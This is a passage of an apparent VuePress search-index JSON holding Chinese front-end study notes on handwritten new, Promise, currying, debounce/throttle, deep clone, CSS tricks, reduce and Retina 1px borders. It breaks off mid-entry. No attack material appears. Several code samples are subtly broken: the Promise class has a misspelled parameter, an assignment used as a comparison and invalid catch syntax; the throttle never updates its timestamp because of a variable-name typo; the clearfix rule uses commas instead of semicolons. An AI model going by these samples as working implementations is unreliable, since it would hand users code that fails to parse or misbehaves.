      "regularPath": "/javascript/%E6%89%8B%E5%86%99new%E6%93%8D%E4%BD%9C%E7%AC%A6.html",
      "relativePath": "javascript/手写new操作符.md",
      "key": "v-772bea3a",
      "path": "/javascript/%E6%89%8B%E5%86%99new%E6%93%8D%E4%BD%9C%E7%AC%A6.html",
      "headers": [
        {
          "level": 2,
          "title": "手写new",
          "slug": "手写new",
          "normalizedTitle": "手写new",
          "charIndex": 2
        }
      ],
      "headersStr": "手写new",
      "content": "# 手写new\n\n/**\n * new操作符\n */\n\nexport function New<T>(constructor:Function,...args:any[]):T{\n  // 1. 创建一个空对象，继承 constructor 的原型\n  const obj = Object.create(constructor.prototype)\n  // 2. 将 obj 作为 this ，执行 constructor ，传入参数\n  constructor.apply(obj,args)\n  return obj\n}\n\nclass Foo {\n  name:string\n  age:number\n  constructor(name:string,age:number){\n    this.name = name\n    this.age = age\n  }\n  getInfo() {\n    return this.name+this.age\n  }\n}\nconst a = New<Foo>(Foo,'yang',18)\nconsole.log('a :>> ', a); \nconsole.log('a.getInfo() :>> ', a.getInfo()); //a.getInfo() :>>  yang18\n",
      "normalizedContent": "# 手写new\n\n/**\n * new操作符\n */\n\nexport function new<t>(constructor:function,...args:any[]):t{\n  // 1. 创建一个空对象，继承 constructor 的原型\n  const obj = object.create(constructor.prototype)\n  // 2. 将 obj 作为 this ，执行 constructor ，传入参数\n  constructor.apply(obj,args)\n  return obj\n}\n\nclass foo {\n  name:string\n  age:number\n  constructor(name:string,age:number){\n    this.name = name\n    this.age = age\n  }\n  getinfo() {\n    return this.name+this.age\n  }\n}\nconst a = new<foo>(foo,'yang',18)\nconsole.log('a :>> ', a); \nconsole.log('a.getinfo() :>> ', a.getinfo()); //a.getinfo() :>>  yang18\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "手写promise",
      "frontmatter": {
        "title": "手写promise"
      },
      "regularPath": "/javascript/%E6%89%8B%E5%86%99promise.html",
      "relativePath": "javascript/手写promise.md",
      "key": "v-2e77ec4c",
      "path": "/javascript/%E6%89%8B%E5%86%99promise.html",
      "headers": [
        {
          "level": 3,
          "title": "手写promise",
          "slug": "手写promise",
          "normalizedTitle": "手写promise",
          "charIndex": 2
        }
      ],
      "headersStr": "手写promise",
      "content": "# 手写promise\n\nclass promise {\n  constructor(executor){\n    //初始化pending\n    this.state = 'pending'\n    //success\n    this.value = undefined\n    //失败\n    this.reason = undefined\n    //resolve\n    let resolve = value=>{\n      if(this.state === 'pending'){\n        this.state = 'fulfilled'\n        this.value = value\n      }\n    }\n    //reject\n    let reject = reson=>{\n      if(this.state = 'pending'){\n        this.state = 'rejected'\n        this.reason = reason\n      }\n    }\n    try {\n      executor(resolve,reject)\n    }catch(err)=>{\n      reject(err)\n    }\n  }\n}\n",
      "normalizedContent": "# 手写promise\n\nclass promise {\n  constructor(executor){\n    //初始化pending\n    this.state = 'pending'\n    //success\n    this.value = undefined\n    //失败\n    this.reason = undefined\n    //resolve\n    let resolve = value=>{\n      if(this.state === 'pending'){\n        this.state = 'fulfilled'\n        this.value = value\n      }\n    }\n    //reject\n    let reject = reson=>{\n      if(this.state = 'pending'){\n        this.state = 'rejected'\n        this.reason = reason\n      }\n    }\n    try {\n      executor(resolve,reject)\n    }catch(err)=>{\n      reject(err)\n    }\n  }\n}\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "函数柯里化",
      "frontmatter": {
        "title": "函数柯里化"
      },
      "regularPath": "/javascript/%E6%9F%AF%E9%87%8C%E5%8C%96%E5%87%BD%E6%95%B0.html",
      "relativePath": "javascript/柯里化函数.md",
      "key": "v-63a30bf0",
      "path": "/javascript/%E6%9F%AF%E9%87%8C%E5%8C%96%E5%87%BD%E6%95%B0.html",
      "headers": [
        {
          "level": 3,
          "title": "柯里化函数",
          "slug": "柯里化函数",
          "normalizedTitle": "柯里化函数",
          "charIndex": 2
        }
      ],
      "headersStr": "柯里化函数",
      "content": "# 柯里化函数\n\n/**\n * @param fn:Function\n * @returns \n */\nfunction curry(fn:Function){\n  const fnLength = fn.length\n  let args:any =[]\n  function calc(this:any,...newArgs:any) {\n    // 积累参数\n    args = [...args,...newArgs]\n    // console.log('args :>> ', args);\n    if(args.length<fnLength){\n      // 参数不够，返回函数\n      return calc\n    }else {\n      // 参数够了，返回执行结果\n      return fn.apply(this,args.slice(0,fnLength))\n    }\n  }\n  return calc\n}\nfunction add(a: number, b: number, c: number): number {\n  return a + b + c\n}\nconst curryAdd = curry(add)\nconst res = curryAdd(1)(2)(3)\nconsole.info(res)\n",
      "normalizedContent": "# 柯里化函数\n\n/**\n * @param fn:function\n * @returns \n */\nfunction curry(fn:function){\n  const fnlength = fn.length\n  let args:any =[]\n  function calc(this:any,...newargs:any) {\n    // 积累参数\n    args = [...args,...newargs]\n    // console.log('args :>> ', args);\n    if(args.length<fnlength){\n      // 参数不够，返回函数\n      return calc\n    }else {\n      // 参数够了，返回执行结果\n      return fn.apply(this,args.slice(0,fnlength))\n    }\n  }\n  return calc\n}\nfunction add(a: number, b: number, c: number): number {\n  return a + b + c\n}\nconst curryadd = curry(add)\nconst res = curryadd(1)(2)(3)\nconsole.info(res)\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "节流和防抖",
      "frontmatter": {
        "title": "节流和防抖"
      },
      "regularPath": "/javascript/%E8%8A%82%E6%B5%81%E5%92%8C%E9%98%B2%E6%8A%96.html",
      "relativePath": "javascript/节流和防抖.md",
      "key": "v-87ba4012",
      "path": "/javascript/%E8%8A%82%E6%B5%81%E5%92%8C%E9%98%B2%E6%8A%96.html",
      "headers": [
        {
          "level": 2,
          "title": "debounce",
          "slug": "debounce",
          "normalizedTitle": "debounce",
          "charIndex": 2
        },
        {
          "level": 2,
          "title": "throttle",
          "slug": "throttle",
          "normalizedTitle": "throttle",
          "charIndex": 341
        }
      ],
      "headersStr": "debounce throttle",
      "content": "# debounce\n\nfunction debounce(func, delay=500) {\n  let timer = null\n  return function(){\n    if(timer){\n      clearTimeout(timer)\n    }\n    timer = setTimeout(()=>{\n      func.apply(this,arguments)\n    },delay)\n  }\n}\nfunction handle() {\n    console.log('防抖：', Math.random());\n}  \nwindow.addEventListener('scroll', debounce(handle,500))\n\n\n\n# throttle\n\nfunction throttle(func, delay=500) {\n  let prevTime = 0\n  return function() {\n    if (Date.now() - prevTime > delay) {\n      func.apply(this, arguments)\n      prevTimer = Date.now()\n    }\n  }\n}\nfunction testFn (){\n    console.log(new Date().getTime());\n}\nwindow.onscroll = throttle(testFn, 200);\n",
      "normalizedContent": "# debounce\n\nfunction debounce(func, delay=500) {\n  let timer = null\n  return function(){\n    if(timer){\n      cleartimeout(timer)\n    }\n    timer = settimeout(()=>{\n      func.apply(this,arguments)\n    },delay)\n  }\n}\nfunction handle() {\n    console.log('防抖：', math.random());\n}  \nwindow.addeventlistener('scroll', debounce(handle,500))\n\n\n\n# throttle\n\nfunction throttle(func, delay=500) {\n  let prevtime = 0\n  return function() {\n    if (date.now() - prevtime > delay) {\n      func.apply(this, arguments)\n      prevtimer = date.now()\n    }\n  }\n}\nfunction testfn (){\n    console.log(new date().gettime());\n}\nwindow.onscroll = throttle(testfn, 200);\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "深拷贝",
      "frontmatter": {
        "title": "深拷贝"
      },
      "regularPath": "/javascript/%E6%B7%B1%E6%8B%B7%E8%B4%9D.html",
      "relativePath": "javascript/深拷贝.md",
      "key": "v-8737a776",
      "path": "/javascript/%E6%B7%B1%E6%8B%B7%E8%B4%9D.html",
      "headers": [
        {
          "level": 2,
          "title": "递归实现",
          "slug": "递归实现",
          "normalizedTitle": "递归实现",
          "charIndex": 2
        }
      ],
      "headersStr": "递归实现",
      "content": "# 递归实现\n\n注意typeof instanceof hasOwnProperty的使用\n\nfunction deepClone(obj = {}) {\n    if (typeof obj !== \"object\" || obj == null) {\n      return obj;\n    }\n    let result;\n    if (obj instanceof Array) {\n      result = [];\n    } else {\n      result = {};\n    }\n    for (let key in obj) {\n      if (obj.hasOwnProperty(key)) {\n        //obj.hasOwnProperty(key)? 保证key不是原型的属性\n        //接下来递归\n        result[key] = deepClone(obj[key]);\n      }\n    }\n    return result\n  }\n",
      "normalizedContent": "# 递归实现\n\n注意typeof instanceof hasownproperty的使用\n\nfunction deepclone(obj = {}) {\n    if (typeof obj !== \"object\" || obj == null) {\n      return obj;\n    }\n    let result;\n    if (obj instanceof array) {\n      result = [];\n    } else {\n      result = {};\n    }\n    for (let key in obj) {\n      if (obj.hasownproperty(key)) {\n        //obj.hasownproperty(key)? 保证key不是原型的属性\n        //接下来递归\n        result[key] = deepclone(obj[key]);\n      }\n    }\n    return result\n  }\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "文字超出省略",
      "frontmatter": {
        "title": "文字超出省略"
      },
      "regularPath": "/webstudy/CSS/%E6%96%87%E5%AD%97%E8%B6%85%E5%87%BA%E7%9C%81%E7%95%A5.html",
      "relativePath": "webstudy/CSS/文字超出省略.md",
      "key": "v-3359d280",
      "path": "/webstudy/CSS/%E6%96%87%E5%AD%97%E8%B6%85%E5%87%BA%E7%9C%81%E7%95%A5.html",
      "headers": [
        {
          "level": 2,
          "title": "单行文字",
          "slug": "单行文字",
          "normalizedTitle": "单行文字",
          "charIndex": 13
        },
        {
          "level": 2,
          "title": "多行文字",
          "slug": "多行文字",
          "normalizedTitle": "多行文字",
          "charIndex": 177
        }
      ],
      "headersStr": "单行文字 多行文字",
      "content": "# 文字超出省略\n\n\n# 单行文字\n\n#box1 {\n    border: 1px solid #ccc;\n    width: 100px;\n    white-space: nowrap; /* 不换行 */\n    overflow: hidden;\n    text-overflow: ellipsis; /* 超出省略 */\n}\n\n\n\n# 多行文字\n\n#box2 {\n    border: 1px solid #ccc;\n    width: 100px;\n    overflow: hidden;\n    display: -webkit-box; /* 将对象作为弹性伸缩盒子模型显示 */\n    -webkit-box-orient: vertical; /* 设置子元素排列方式 */\n    -webkit-line-clamp: 3; /* 显示几行，超出的省略 */\n}\n",
      "normalizedContent": "# 文字超出省略\n\n\n# 单行文字\n\n#box1 {\n    border: 1px solid #ccc;\n    width: 100px;\n    white-space: nowrap; /* 不换行 */\n    overflow: hidden;\n    text-overflow: ellipsis; /* 超出省略 */\n}\n\n\n\n# 多行文字\n\n#box2 {\n    border: 1px solid #ccc;\n    width: 100px;\n    overflow: hidden;\n    display: -webkit-box; /* 将对象作为弹性伸缩盒子模型显示 */\n    -webkit-box-orient: vertical; /* 设置子元素排列方式 */\n    -webkit-line-clamp: 3; /* 显示几行，超出的省略 */\n}\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "零碎的知识",
      "frontmatter": {
        "title": "零碎的知识"
      },
      "regularPath": "/webstudy/CSS/%E9%9B%B6%E7%A2%8E%E7%9A%84%E7%9F%A5%E8%AF%86.html",
      "relativePath": "webstudy/CSS/零碎的知识.md",
      "key": "v-3761fc08",
      "path": "/webstudy/CSS/%E9%9B%B6%E7%A2%8E%E7%9A%84%E7%9F%A5%E8%AF%86.html",
      "headers": [
        {
          "level": 2,
          "title": "css 盒模型",
          "slug": "css-盒模型",
          "normalizedTitle": "css 盒模型",
          "charIndex": 12
        },
        {
          "level": 2,
          "title": "px，em，rem，vh/vw",
          "slug": "px-em-rem-vh-vw",
          "normalizedTitle": "px，em，rem，vh/vw",
          "charIndex": 206
        },
        {
          "level": 2,
          "title": "伪类选择器",
          "slug": "伪类选择器",
          "normalizedTitle": "伪类选择器",
          "charIndex": 389
        },
        {
          "level": 2,
          "title": "BFC",
          "slug": "bfc",
          "normalizedTitle": "bfc",
          "charIndex": 540
        },
        {
          "level": 2,
          "title": "div 水平垂直居中（至少三种）",
          "slug": "div-水平垂直居中-至少三种",
          "normalizedTitle": "div 水平垂直居中（至少三种）",
          "charIndex": 1350
        },
        {
          "level": 2,
          "title": "清除浮动",
          "slug": "清除浮动",
          "normalizedTitle": "清除浮动",
          "charIndex": 1926
        },
        {
          "level": 2,
          "title": "0.5px 的线",
          "slug": "_0-5px-的线",
          "normalizedTitle": "0.5px 的线",
          "charIndex": 2009
        },
        {
          "level": 2,
          "title": "link 与 @import 区别",
          "slug": "link-与-import-区别",
          "normalizedTitle": "link 与 @import 区别",
          "charIndex": 2251
        },
        {
          "level": 3,
          "title": "区别",
          "slug": "区别",
          "normalizedTitle": "区别",
          "charIndex": 2266
        },
        {
          "level": 3,
          "title": "兼容性",
          "slug": "兼容性",
          "normalizedTitle": "兼容性",
          "charIndex": 2368
        },
        {
          "level": 3,
          "title": "性能方面",
          "slug": "性能方面",
          "normalizedTitle": "性能方面",
          "charIndex": 2434
        },
        {
          "level": 2,
          "title": "requestAnimationFrame",
          "slug": "requestanimationframe",
          "normalizedTitle": "requestanimationframe",
          "charIndex": 2490
        }
      ],
      "headersStr": "css 盒模型 px，em，rem，vh/vw 伪类选择器 BFC div 水平垂直居中（至少三种） 清除浮动 0.5px 的线 link 与 @import 区别 区别 兼容性 性能方面 requestAnimationFrame",
      "content": "# 零碎的知识\n\n\n# css 盒模型\n\nCSS 盒模型分为两种，一种是标准盒模型，一种是 IE 盒模型\n\n# 标准盒模型\n\n结构是 content+padding+border+margin，元素的宽高只是 content 部分\n\n# IE 盒模型\n\n结构同上 但是宽高却把 padding 和 border 也算在内了\n\n# 如何切换为 IE 盒模型\n\nbox-sizing: border-box\n\n\n# px，em，rem，vh/vw\n\n * px 像素单位\n * em 相对于当前元素的 font-size。首行缩进可以使用 text-indent: 2em。\n * rem = root em，相对于根元素的 font-size 。可以根据媒体查询，设置根元素的 font-size ，实现移动端适配。\n * vw 屏幕宽度的 1%,vh 屏幕高度的 1%\n\n\n# 伪类选择器\n\n * :hover\n * :first-child 例如: p:first-child i 第一个子元素的 p 元素中的所有 i 元素\n * :last-child\n * :not(selector)\n * :nth-child(n)\n * :nth-last-child(n)\n\n\n# BFC\n\n块格式化上下文\n\n例如：\n\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>BFC</title>\n    <style>\n      .green {\n            width: 200px;\n            height: 100px;\n            margin-bottom: 20px;\n            background-color: green;\n        }\n        .red {\n            width: 200px;\n            height: 100px;\n            margin-top: 30px;\n            background-color: red;\n        }\n        .box {\n            /* overflow: hidden; */\n            display: flow-root; /**元素块状化，同时包含格式化上下文BFC*/\n        } \n  </style>\n</head>\n<body>\n    <div class=\"green\"></div>\n    <div class=\"box\">\n        <div class=\"red\">BFC</div>\n    </div>\n</body>\n</html>\n\n\n\n\n# div 水平垂直居中（至少三种）\n\n/**第一种*/\n.div1 {\n  width: 400px;\n  height: 400px;\n  border: #ccc 1px solid;\n  background: #99f;\n  position: absolute;\n  left: 50%;\n  top: 50%;\n  transform: translate(-50%, -50%);\n}\n/**第二种*/\n.div2 {\n  width: 400px;\n  height: 400px;\n  border: #ccc 1px solid;\n  background: #99f;\n  position: absolute;\n  left: 0;\n  top: 0;\n  bottom: 0;\n  right: 0;\n  margin: auto;\n}\n/**第三种*/\n.div3 {\n  width: 400px;\n  height: 400px;\n  border: #ccc 1px solid;\n  background: #9f9;\n  position: absolute;\n  left: 50%;\n  top: 50%;\n  margin-left: -200px;\n  margin-top: -200px;\n}\n\n\n\n# 清除浮动\n\n.clearfix:after {\n    content:'',\n    display:table,\n    clear:both\n  }\n\n\n\n# 0.5px 的线\n\n#box {\n    padding: 10px 0;\n    position: relative;\n}\n#box::before {\n    content: '';\n    position: absolute;\n    left: 0;\n    bottom: 0;\n    width: 100%;\n    height: 1px;\n    background: #d9d9d9;\n    transform: scaleY(0.5);\n}\n\n\n\n# link 与 @import 区别\n\n\n# 区别\n\n * link 是 HTML 的标签，可以在 html 页面中使用 link 标签来加载 CSS 资源\n * @import 是 CSS 的标准，只能在 css 文件中使用\n\n\n# 兼容性\n\n * link 不会有兼容性问题，因为是一个标准的标签 而@import 可能在某些低版本浏览器中会有兼容性问题\n\n\n# 性能方面\n\n * @import 由于是在 css 中引入了额外的 css，有时候页面会出现闪烁的问题\n\n\n# requestAnimationFrame\n\n首先要知道它是干啥的？ 它是用来定义动画，我们知道定义动画有大概这么几种：\n\n * 一种是 transition，即过渡。\n * 第二种是 animation，即动画\n * 第三种，就是利用 js 的 setTimeout，setInterval 这种写动画 requestAnimationFrame 的出现提供了第四种可能，而且在各方面完胜第三种，可以说是第三种的替代品。 其优点在以下几个方面： CPU 性能：使用 requestAnimationFrame 定义的动画，在浏览器最小化，元素消失的时候，就不会再继续下去了，可以提高性能。 函数节流：在动画间隔时间内，只会执行一次。 减少 DOM 操作：每一帧的动画会将所有的 DOM 操作集合起来，在重绘或者回流中一次性搞定 使用: id = window.requestAnimationFrame(cb); 取消动画: window.cancelAnimationFrame(id)",
      "normalizedContent": "# 零碎的知识\n\n\n# css 盒模型\n\ncss 盒模型分为两种，一种是标准盒模型，一种是 ie 盒模型\n\n# 标准盒模型\n\n结构是 content+padding+border+margin，元素的宽高只是 content 部分\n\n# ie 盒模型\n\n结构同上 但是宽高却把 padding 和 border 也算在内了\n\n# 如何切换为 ie 盒模型\n\nbox-sizing: border-box\n\n\n# px，em，rem，vh/vw\n\n * px 像素单位\n * em 相对于当前元素的 font-size。首行缩进可以使用 text-indent: 2em。\n * rem = root em，相对于根元素的 font-size 。可以根据媒体查询，设置根元素的 font-size ，实现移动端适配。\n * vw 屏幕宽度的 1%,vh 屏幕高度的 1%\n\n\n# 伪类选择器\n\n * :hover\n * :first-child 例如: p:first-child i 第一个子元素的 p 元素中的所有 i 元素\n * :last-child\n * :not(selector)\n * :nth-child(n)\n * :nth-last-child(n)\n\n\n# bfc\n\n块格式化上下文\n\n例如：\n\n<!doctype html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"x-ua-compatible\" content=\"ie=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>bfc</title>\n    <style>\n      .green {\n            width: 200px;\n            height: 100px;\n            margin-bottom: 20px;\n            background-color: green;\n        }\n        .red {\n            width: 200px;\n            height: 100px;\n            margin-top: 30px;\n            background-color: red;\n        }\n        .box {\n            /* overflow: hidden; */\n            display: flow-root; /**元素块状化，同时包含格式化上下文bfc*/\n        } \n  </style>\n</head>\n<body>\n    <div class=\"green\"></div>\n    <div class=\"box\">\n        <div class=\"red\">bfc</div>\n    </div>\n</body>\n</html>\n\n\n\n\n# div 水平垂直居中（至少三种）\n\n/**第一种*/\n.div1 {\n  width: 400px;\n  height: 400px;\n  border: #ccc 1px solid;\n  background: #99f;\n  position: absolute;\n  left: 50%;\n  top: 50%;\n  transform: translate(-50%, -50%);\n}\n/**第二种*/\n.div2 {\n  width: 400px;\n  height: 400px;\n  border: #ccc 1px solid;\n  background: #99f;\n  position: absolute;\n  left: 0;\n  top: 0;\n  bottom: 0;\n  right: 0;\n  margin: auto;\n}\n/**第三种*/\n.div3 {\n  width: 400px;\n  height: 400px;\n  border: #ccc 1px solid;\n  background: #9f9;\n  position: absolute;\n  left: 50%;\n  top: 50%;\n  margin-left: -200px;\n  margin-top: -200px;\n}\n\n\n\n# 清除浮动\n\n.clearfix:after {\n    content:'',\n    display:table,\n    clear:both\n  }\n\n\n\n# 0.5px 的线\n\n#box {\n    padding: 10px 0;\n    position: relative;\n}\n#box::before {\n    content: '';\n    position: absolute;\n    left: 0;\n    bottom: 0;\n    width: 100%;\n    height: 1px;\n    background: #d9d9d9;\n    transform: scaley(0.5);\n}\n\n\n\n# link 与 @import 区别\n\n\n# 区别\n\n * link 是 html 的标签，可以在 html 页面中使用 link 标签来加载 css 资源\n * @import 是 css 的标准，只能在 css 文件中使用\n\n\n# 兼容性\n\n * link 不会有兼容性问题，因为是一个标准的标签 而@import 可能在某些低版本浏览器中会有兼容性问题\n\n\n# 性能方面\n\n * @import 由于是在 css 中引入了额外的 css，有时候页面会出现闪烁的问题\n\n\n# requestanimationframe\n\n首先要知道它是干啥的？ 它是用来定义动画，我们知道定义动画有大概这么几种：\n\n * 一种是 transition，即过渡。\n * 第二种是 animation，即动画\n * 第三种，就是利用 js 的 settimeout，setinterval 这种写动画 requestanimationframe 的出现提供了第四种可能，而且在各方面完胜第三种，可以说是第三种的替代品。 其优点在以下几个方面： cpu 性能：使用 requestanimationframe 定义的动画，在浏览器最小化，元素消失的时候，就不会再继续下去了，可以提高性能。 函数节流：在动画间隔时间内，只会执行一次。 减少 dom 操作：每一帧的动画会将所有的 dom 操作集合起来，在重绘或者回流中一次性搞定 使用: id = window.requestanimationframe(cb); 取消动画: window.cancelanimationframe(id)",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "reduce",
      "frontmatter": {
        "title": "reduce"
      },
      "regularPath": "/webstudy/ES6%E5%8F%8A%E4%BB%A5%E4%B8%8A/reduce.html",
      "relativePath": "webstudy/ES6及以上/reduce.md",
      "key": "v-6669fe90",
      "path": "/webstudy/ES6%E5%8F%8A%E4%BB%A5%E4%B8%8A/reduce.html",
      "headers": [
        {
          "level": 2,
          "title": "reduce",
          "slug": "reduce",
          "normalizedTitle": "reduce",
          "charIndex": 2
        },
        {
          "level": 3,
          "title": "基本",
          "slug": "基本",
          "normalizedTitle": "基本",
          "charIndex": 13
        },
        {
          "level": 3,
          "title": "使用",
          "slug": "使用",
          "normalizedTitle": "使用",
          "charIndex": 133
        }
      ],
      "headersStr": "reduce 基本 使用",
      "content": "# reduce\n\n\n# 基本\n\n> arr.reduce(callback, [initialValue])\n\ncallback包括四个参数\n\n * accumulator\n * currentValue\n * currentIndex\n * array\n\n\n# 使用\n\n# 求和\n\nlet arr = [1,2,3,4]\narr.reduce((accumulator, currentValue, currentIndex)=>{\n  return accumulator+currentValue\n},0)\n\n\n# 求最大值最小值\n\nlet arr = [200,2,3,4,100];\n let arrresult = arr.reduce((accumulator, currentValue, currentIndex) => {\n    return Math.max(accumulator, currentValue)\n })\n console.log(arrresult) //200\n let arrresult1 = arr.reduce((accumulator, currentValue, currentIndex) => {\n          return Math.min(accumulator, currentValue)\n })\n console.log(arrresult1) //2\n //过于麻烦\n //不如\n Math.max(...[1,2,3,4])\n\n\n# 去重unique\n\n let array = [\n  { id: 1, name: \"a\" },\n  { id: 2, name: \"b\" },\n  { id: 3, name: \"c\" },\n  { id: 5, name: \"d\" },\n  { id: 1, name: \"e\" },\n];\nfunction unique(arr,key){\n  let obj = {}\n  return arr.reduce((accumulator,currentValue,currentIndex)=>{\n   //当前key键的value值存在于obj函数中时,说明重复\n    if(!obj[currentValue[key]]){\n      obj[currentValue[key]]=true\n      accumulator.push(currentValue)\n    }\n    return accumulator\n  },[])\n}\nconsole.log('unique(array,id) :>> ', unique(array,'id'));\n\n\n# 扁平化flatten\n\nfunction flatten(arr){\n  return arr.reduce((accumulator,currentValue,currentIndex)=>{\n    return accumulator.concat(Array.isArray(currentValue)?flatten(currentValue):currentValue)\n  },[])\n}\nconsole.log(flatten([1,[2,3],[4,5,[6,7]]]))\n",
      "normalizedContent": "# reduce\n\n\n# 基本\n\n> arr.reduce(callback, [initialvalue])\n\ncallback包括四个参数\n\n * accumulator\n * currentvalue\n * currentindex\n * array\n\n\n# 使用\n\n# 求和\n\nlet arr = [1,2,3,4]\narr.reduce((accumulator, currentvalue, currentindex)=>{\n  return accumulator+currentvalue\n},0)\n\n\n# 求最大值最小值\n\nlet arr = [200,2,3,4,100];\n let arrresult = arr.reduce((accumulator, currentvalue, currentindex) => {\n    return math.max(accumulator, currentvalue)\n })\n console.log(arrresult) //200\n let arrresult1 = arr.reduce((accumulator, currentvalue, currentindex) => {\n          return math.min(accumulator, currentvalue)\n })\n console.log(arrresult1) //2\n //过于麻烦\n //不如\n math.max(...[1,2,3,4])\n\n\n# 去重unique\n\n let array = [\n  { id: 1, name: \"a\" },\n  { id: 2, name: \"b\" },\n  { id: 3, name: \"c\" },\n  { id: 5, name: \"d\" },\n  { id: 1, name: \"e\" },\n];\nfunction unique(arr,key){\n  let obj = {}\n  return arr.reduce((accumulator,currentvalue,currentindex)=>{\n   //当前key键的value值存在于obj函数中时,说明重复\n    if(!obj[currentvalue[key]]){\n      obj[currentvalue[key]]=true\n      accumulator.push(currentvalue)\n    }\n    return accumulator\n  },[])\n}\nconsole.log('unique(array,id) :>> ', unique(array,'id'));\n\n\n# 扁平化flatten\n\nfunction flatten(arr){\n  return arr.reduce((accumulator,currentvalue,currentindex)=>{\n    return accumulator.concat(array.isarray(currentvalue)?flatten(currentvalue):currentvalue)\n  },[])\n}\nconsole.log(flatten([1,[2,3],[4,5,[6,7]]]))\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "Retina屏幕1px宽度",
      "frontmatter": {
        "title": "Retina屏幕1px宽度"
      },
      "regularPath": "/webstudy/CSS/Retina%E5%B1%8F%E5%B9%951px%E5%AE%BD%E5%BA%A6.html",
      "relativePath": "webstudy/CSS/Retina屏幕1px宽度.md",
      "key": "v-e451ceda",
      "path": "/webstudy/CSS/Retina%E5%B1%8F%E5%B9%951px%E5%AE%BD%E5%BA%A6.html",
      "headers": [
        {
          "level": 2,
          "title": "普通的 1px",
          "slug": "普通的-1px",
          "normalizedTitle": "普通的 1px",
          "charIndex": 52
        },
        {
          "level": 2,
          "title": "可以使用 transform 缩小",
          "slug": "可以使用-transform-缩小",
          "normalizedTitle": "可以使用 transform 缩小",
          "charIndex": 263
        },
        {
          "level": 2,
          "title": "继续思考？如果有 border-radius 怎么办",
          "slug": "继续思考-如果有-border-radius-怎么办",
          "normalizedTitle": "继续思考？如果有 border-radius 怎么办",
          "charIndex": 595
        }
      ],
      "headersStr": "普通的 1px 可以使用 transform 缩小 继续思考？如果有 border-radius 怎么办",
      "content": "# Retina屏幕1px宽度\n\n思考？Retina(视网膜) 屏 1px 像素问题，如何实现\n\n\n# 普通的 1px\n\n如果仅仅使用 css 的 1px 来设置 border ，那可能会出现比较粗的情况。\n因为，有些手机屏幕的 DPR = 2 ，即 1px 它会用两个物理像素来显示，就粗了。\n\n#box {\n    padding: 10px 0;\n    border-bottom: 1px solid #eee;\n}\n\n\n注意：不能直接写 0.5px ，浏览器兼容性不好，渲染出来可能还是 1px 的效果。\n\n\n# 可以使用 transform 缩小\n\n使用 css 伪类 + transform 来优化这一问题。即把默认的 1px 宽度给压缩 0.5 倍。\n\n#box {\n    padding: 10px 0;\n    position: relative;\n}\n#box::before {\n    content: '';\n    position: absolute;\n    left: 0;\n    bottom: 0;\n    width: 100%;\n    height: 1px;\n    background: #d9d9d9;\n    transform: scaleY(0.5);\n    transform-origin: 0 0;\n}\n\n\n\n# 继续思考？如果有 border-radius 怎么办\n\n可以使用 box-shadow 设置\n\n * X 偏移量 0\n * Y 偏移量 0\n * 阴影模糊半径 0\n * 阴影扩散半径 0.5px\n * 阴影颜色\n\n#box2 {\n    margin-top: 20px;\n    padding: 10px;\n    border-radius: 5px;\n    /* border: 1px solid #d9d9d9; */\n    box-shadow: 0 0 0 0.5px #d9d9d9;\n}\n",
      "normalizedContent": "# retina屏幕1px宽度\n\n思考？retina(视网膜) 屏 1px 像素问题，如何实现\n\n\n# 普通的 1px\n\n如果仅仅使用 css 的 1px 来设置 border ，那可能会出现比较粗的情况。\n因为，有些手机屏幕的 dpr = 2 ，即 1px 它会用两个物理像素来显示，就粗了。\n\n#box {\n    padding: 10px 0;\n    border-bottom: 1px solid #eee;\n}\n\n\n注意：不能直接写 0.5px ，浏览器兼容性不好，渲染出来可能还是 1px 的效果。\n\n\n# 可以使用 transform 缩小\n\n使用 css 伪类 + transform 来优化这一问题。即把默认的 1px 宽度给压缩 0.5 倍。\n\n#box {\n    padding: 10px 0;\n    position: relative;\n}\n#box::before {\n    content: '';\n    position: absolute;\n    left: 0;\n    bottom: 0;\n    width: 100%;\n    height: 1px;\n    background: #d9d9d9;\n    transform: scaley(0.5);\n    transform-origin: 0 0;\n}\n\n\n\n# 继续思考？如果有 border-radius 怎么办\n\n可以使用 box-shadow 设置\n\n * x 偏移量 0\n * y 偏移量 0\n * 阴影模糊半径 0\n * 阴影扩散半径 0.5px\n * 阴影颜色\n\n#box2 {\n    margin-top: 20px;\n    padding: 10px;\n    border-radius: 5px;\n    /* border: 1px solid #d9d9d9; */\n    box-shadow: 0 0 0 0.5px #d9d9d9;\n}\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "箭头函数",
      "frontmatter": {
        "title": "箭头函数"
      },
      "regularPath": "/webstudy/ES6%E5%8F%8A%E4%BB%A5%E4%B8%8A/%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0.html",
      "relativePath": "webstudy/ES6及以上/箭头函数.md",
      "key": "v-4e2bb218",
      "path": "/webstudy/ES6%E5%8F%8A%E4%BB%A5%E4%B8%8A/%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0.html",
      "headers": [
        {
          "level": 2,
          "title": "箭头函数",
          "slug": "箭头函数",
          "normalizedTitle": "箭头函数",
          "charIndex": 2
        },
        {
          "level": 3,
          "title": "箭头函数的缺点",
          "slug": "箭头函数的缺点",
          "normalizedTitle": "箭头函数的缺点",
          "charIndex": 11
        },
        {
          "level": 3,
          "title": "哪些场景不能使用this",
          "slug": "哪些场景不能使用this",
          "normalizedTitle": "哪些场景不能使用this",
          "charIndex": 387
        }
      ],
      "headersStr": "箭头函数 箭头函数的缺点 哪些场景不能使用this",
